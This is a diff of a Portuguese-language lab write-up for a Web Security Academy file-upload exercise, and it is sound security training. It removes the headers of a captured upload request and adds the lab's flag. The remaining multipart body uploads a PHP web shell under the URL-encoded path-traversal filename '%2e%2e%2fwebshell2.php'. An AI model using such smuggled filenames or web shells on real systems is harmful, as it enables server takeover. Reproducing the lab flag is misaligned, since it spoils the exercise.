@@ -141,27 +141,6 @@ Crie um arquivo com o conteudo
 
 Submeta o arquivo para upload e acesse pelo navegador
 ````http
-POST /my-account/avatar HTTP/1.1
-Host: ac1b1f581efc5186c09f18ab00760048.web-security-academy.net
-Cookie: session=DBFf3DQa2L2h8OATKYCUbhOxw7AvFvXd
-Content-Length: 474
-Cache-Control: max-age=0
-Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: "Windows"
-Upgrade-Insecure-Requests: 1
-Origin: https://ac1b1f581efc5186c09f18ab00760048.web-security-academy.net
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywl7b3A4o80gjAjZb
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Referer: https://ac1b1f581efc5186c09f18ab00760048.web-security-academy.net/my-account
-Accept-Encoding: gzip, deflate
-Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
-Connection: close
 
 ------WebKitFormBoundarywl7b3A4o80gjAjZb
 Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fwebshell2.php"
@@ -178,5 +157,7 @@ Content-Disposition: form-data; name="csrf"
 D3cLNSSIkUUvvKdxO0LsCy8ryg6CxhH7
 ------WebKitFormBoundarywl7b3A4o80gjAjZb--
 ````
+
+`Flag: XkJTTpCMVsexpPb2EkLhZpRnuIhc7D1h`
 
 ### >> 4. 
